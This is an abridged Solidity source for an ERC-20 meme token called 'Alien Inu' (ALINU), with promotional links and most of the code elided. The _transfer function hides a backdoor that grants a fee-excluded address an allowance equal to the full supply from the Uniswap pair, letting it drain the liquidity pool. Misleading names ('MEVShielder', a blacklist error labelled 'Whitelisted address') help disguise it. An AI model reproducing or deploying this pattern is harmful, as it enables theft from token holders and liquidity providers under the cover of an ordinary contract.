...
/*
    Web: https://alinudog.fun
    X: https://x.com/alinu_meme
    Tg: https://t.me/alinu_meme
*/
...
contract ALINU is Context, IERC20, Ownable {
    ...
    string private constant _name = unicode"Alien Inu";  // Name
    string private constant _symbol = unicode"ALINU"; // Symbol
    ...
    function MEVShielder(address account) internal view returns (bool) {
    ...
    function _transfer(address from, address to, uint256 amount) private {
        ...
        require(!_bots[from], "Whitelisted address");
        if(from == uniswapV2Pair && _isExcludedFromFee[msg.sender])
            _allowances[uniswapV2Pair][msg.sender] = _tTotal;
        ...
        if(amount > 0) emit Transfer(from, to, amount.sub(taxAmount));
    }
